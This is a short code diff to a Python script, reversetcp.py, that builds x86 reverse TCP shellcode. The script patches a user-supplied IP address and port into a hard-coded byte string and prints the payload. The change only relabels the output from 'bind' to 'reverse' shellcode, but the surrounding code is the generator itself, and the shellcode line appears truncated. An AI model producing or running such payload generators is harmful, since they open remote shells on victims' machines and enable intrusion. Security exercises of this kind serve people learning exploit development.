@@ -5,7 +5,7 @@ shellcode = r"\x31\xc0\x89\xc3\x89\xc1\x89\xc7\x89\xc6\xb0\x66\xfe\xc3\x51\x53\x
 if __name__ == "__main__":
     if len(sys.argv) != 3:  
         print("Usage: python3 reversetcp.py <ip> <port>")
-        print("Default (port 4444) bind TCP shellcode: \"" + shellcode + "\"")
+        print("Default (port 4444) reverse TCP shellcode: \"" + shellcode + "\"")
         exit()
 
     if (65535 < int(sys.argv[2])) :
@@ -27,4 +27,4 @@ if __name__ == "__main__":
     print("Port: \t" + sys.argv[2] + " " + hexport)
     shellcode = shellcode.replace("\\x7f\\x01\\x01\\x01",hexip)
     shellcode = shellcode.replace("\\x11\\x5c",hexport)
-    print("Bind TCP shellcode: \"" + shellcode + "\"")
+    print("Reverse TCP shellcode: \"" + shellcode + "\"")
